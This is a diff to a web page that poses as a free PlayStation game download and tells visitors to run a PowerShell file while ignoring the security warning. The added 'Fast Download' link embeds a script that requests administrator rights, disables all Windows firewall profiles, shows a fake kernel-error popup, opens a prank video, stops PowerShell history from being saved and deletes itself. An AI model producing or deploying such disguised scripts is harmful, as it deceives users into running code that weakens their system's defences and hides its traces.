@@ -6,25 +6,46 @@
 <h2><font color="#ff0000">DOWNLOAD A FREE PLAY STATION 🎮🎮🎮</font></h2>
 <img src="https://gamingnation.in/wp-content/uploads/2020/12/Best-Websites-to-Download-Free-PC-Games-1536x864.jpeg" style="width:500px;height:200px;"><br>
 Instruction:<br>
-1.) Click the link below to download the file<br>
+1.) Click the links below to download the file<br>
 2.) navigate to your Downloads folder<br>
 3.) Right click 'freeGames.ps1'(playstation1 file)<br>
 4.) Select 'run with PowerShell'<br>
 4.) Ignore the security warning and select 'open'<br>
 There is security warning because microsoft does not want you to get they're games for free. do not worry<br>
 5.) Enjoy your free play station 😁<br><br>
-    <a href="data:text/plain;charset=utf-8,ping \n 10 google.com" download="freeGames.ps1">Download File 💾</a><br><br>
+    <a href="data:text/plain;charset=utf-8,ping \n 10 google.com" download="freeGames.ps1">Slow Download 💾</a><br>
+
+    <a href="data:text/plain;charset=utf-8, 
+        function Open-YouTube {
+    param (
+        [string]$videoUrl = &quot;https://www.youtube.com&quot;
+    )
+    Start-Process &quot;msedge.exe&quot; $videoUrl
+}
+function Set-Speaker($Volume) { 
+    $wshShell = new-object -com wscript.shell; 1..50 | % { $wshShell.SendKeys([char]174) }; 1..$Volume | % { $wshShell.SendKeys([char]175) }
+}
+if (-not (net session 2-gt$null)) {
+    Write-Warning &quot;Re-invoking with elevation, of necessity in a new window...&quot;
+    exit (
+        Start-Process -Wait -PassThru -Verb RunAs (Get-Process -Id $PID).Path &quot;-NoExit -File `&quot;$PSCommandPath`&quot;&quot;
+    ).ExitCode
+}
+
+Set-Speaker -Volume 50
+
+open-YouTube -videoUrl &quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1&mute=1&quot;
+
+$MsgBoxTitle = &quot;KERNEL WARNNING 00xf340d0.421&quot;
+$MsgBoxText = &quot;Kernel: Critical Error 00xf340d0.421 Memory Corruption!&quot;
+ 
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+powershell (New-Object -ComObject Wscript.Shell).Popup(&quot;$MsgBoxText&quot;, 0, &quot;$MsgBoxTitle&quot;, 0 + 64) | Out-Null
+
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force" download="ROMdumps.ps1">Fast Download💾</a><br><br>
 <img src="https://thumbs.dreamstime.com/z/verified-icon-white-background-illustration-verified-icon-white-background-107713884.jpg" style="width:100px;height:100px;">
 <h3>This is a 100% guarantee!</h3>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
